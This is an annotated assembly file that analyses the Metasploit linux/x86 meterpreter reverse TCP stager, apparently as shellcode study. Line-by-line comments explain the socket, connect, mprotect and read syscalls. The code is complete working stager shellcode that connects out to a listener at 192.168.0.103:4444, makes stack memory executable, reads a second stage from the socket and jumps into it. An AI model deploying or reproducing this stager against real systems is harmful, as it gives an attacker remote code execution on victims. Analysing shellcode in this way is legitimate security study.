; Filename: analyze_meterpreter_reverse_tcp_opcodes.asm
; Name of payload: meterpreter.rb

; Source:

; /opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/metasploit-framework-4.12.20/modules/payloads/stages/linux/x86/meterpreter.rb

; from /usr/include/i386-linux-gnu/asm/unistd_32.h
    ; #define __NR_socketcall 102

; from man socketcall
    ; int socketcall(int call, unsigned long *args);    

; from /usr/include/linux/net                                                                                           
    ; #define SYS_SOCKET  1       /* sys_socket(2)        */
    ; #define SYS_CONNECT 3       /* sys_connect(2)       */

; from man 2 socket 
    ; int socket(int domain, int type, int protocol);

; from man 2 connect
    ; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);

; from /usr/include/i386-linux-gnu/bits/socket.h
   ; #define AF_INET     2   /* Internet IP Protocol     */

; from man mprotect
    ; mprotect() changes protection for the calling process's memory page(s) containing any part of the address range in the interval [addr, addr+len-1]. addr must be aligned to a page boundary
    ; int mprotect(void *addr, size_t len, int prot);

; from /usr/include/asm-generic/mman-common.h
    ; #define PROT_READ   0x1     /* page can be read */
    ; #define PROT_WRITE  0x2     /* page can be written */
    ; #define PROT_EXEC   0x4     /* page can be executed */
    ; #define PROT_NONE   0x0     /* page can not be accessed */

; from man read
    ; ssize_t read(int fd, void *buf, size_t count);


global _start

section .text

_start:

    ; socket() syscall

    00000000  31DB              xor ebx,ebx                 ; zero EBX
    00000002  F7E3              mul ebx                     ; zero EAX and EDX
    00000004  53                push ebx                    ; push EBX (0x0) on the stack for socket() protocol argument 
    00000005  43                inc ebx                     ; increment EBX, which becomes 0x1
    00000006  53                push ebx                    ; push EBX (0x1) on the stack for socket() type argument
    00000007  6A02              push byte +0x2              ; push 0x2 on the stack for socket() domain argument
    00000009  B066              mov al,0x66                 ; move 0x66 (102) in EAX 
    0000000B  89E1              mov ecx,esp                 ; move ESP (address of the top of the stack) in ECX so that it stores a pointer to the arguments
    0000000D  CD80              int 0x80                    ; invoke socketcall() syscall
                                                            ; int socketcall(int call, unsigned long *args);    
                                                            ; int socket(int domain, int type, int protocol);
                                                            ; EAX gets 0x66 (socketcall() syscall), EBX gets 0x1 (socket() syscall), ECX gets the address of the arguments: 0x2 (AF_INET), 0x1 (SOCK_STREAM) and 0x0 (protocol)


    ; connect() syscall
    
    0000000F  97                xchg eax,edi                ; exchange EAX (return value of socket(), which is the file descriptor for the new socket) with EDI
    00000010  5B                pop ebx                     ; pop the stack in EBX, which gets 0x2
    00000011  68C0A80067        push dword 0x6700a8c0       ; push 192.168.0.103 (IP address of LHOST)
    00000016  680200115C        push dword 0x5c110002       ; push 4444 (port number) and 0x2 (AF_INET)
    0000001B  89E1              mov ecx,esp                 ; move ESP (address of the top of the stack) in ECX
    0000001D  6A66              push byte +0x66             ; push 0x66 (102) on the stack
    0000001F  58                pop eax                     ; pop 0x66 (102) in EAX
    00000020  50                push eax                    ; push EAX (0x66) on the stack
    00000021  51                push ecx                    ; push ECX on the stack
    00000022  57                push edi                    ; push EDI on the stack
    00000023  89E1              mov ecx,esp                 ; move ESP (address of the top of the stack) in ECX
    00000025  43                inc ebx                     ; increment EBX which becomes 0x3
    00000026  CD80              int 0x80                    ; invoke socketcall() syscall
                                                            ; int socketcall(int call, unsigned long *args);    
                                                            ; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
                                                            ; EAX gets 0x66 (socketcall() syscall), EBX gets 0x3 (connect() syscall), ECX gets the address of the arguments: file descriptor for new socket, the IP address of LHOST + the default port number (4444) + protocol family AF_INET (0x2)


    ; mprotect() syscall 

    00000028  B207              mov dl,0x7                  ; move 0x7 in DL
    0000002A  B900100000        mov ecx,0x1000              ; move 0x1000 in ECX
    0000002F  89E3              mov ebx,esp                 ; move ESP (address of the top of the stack) in EBX
    00000031  C1EB0C            shr ebx,byte 0xc            ; logical shift right EBX by 0xc bytes 
    00000034  C1E30C            shl ebx,byte 0xc            ; logical shift left EBX by 0xc bytes (this instruction and the precedent have the effect of turning off the twelve least-significant bits of EBX, thus creating an address pointing at the start of a page
    00000037  B07D              mov al,0x7d                 ; move 0x7d (125) in AL 
    00000039  CD80              int 0x80                    ; invoke mprotect() syscall
                                                            ; int mprotect(void *addr, size_t len, int prot);
                                                            ; EAX gets 0x7d (mprotect() syscall), EBX gets (in my case) 0xbffff000, ECX gets 0x1000 (4096) (causing mprotect() to act on addresses 0xbffff000 to 0xbfffffff), EDX gets 0x7 (which is a bit-wise OR of PROT_READ (0x1), PROT_WRITE (0x2) and PROT_EXEC (0x4)


    ; read() syscall

    0000003B  5B                pop ebx                     ; pop the top of the stack in EBX
    0000003C  89E1              mov ecx,esp                 ; mov ESP (address of the top of the stack) in ECX
    0000003E  99                cdq                         ; convert doubleword to quadword by extending the sign bit of EAX into the EDX register
    0000003F  B60C              mov dh,0xc                  ; move 0xc00 (3072) in DH
    00000041  B003              mov al,0x3                  ; mov 0x3 in AL
    00000043  CD80              int 0x80                    ; invoke read() syscall
                                                            ; ssize_t read(int fd, void *buf, size_t count);
                                                            ; EAX gets 0x3 (read() syscall), EBX gets 0x3 (file descriptor for new socket), ECX gets the address of the top of the stack, EDX gets 0xc00 (3072) (which is the maximum number of bytes to be read)

    00000045  FFE1              jmp ecx                     ; execute what has been read to the buffer
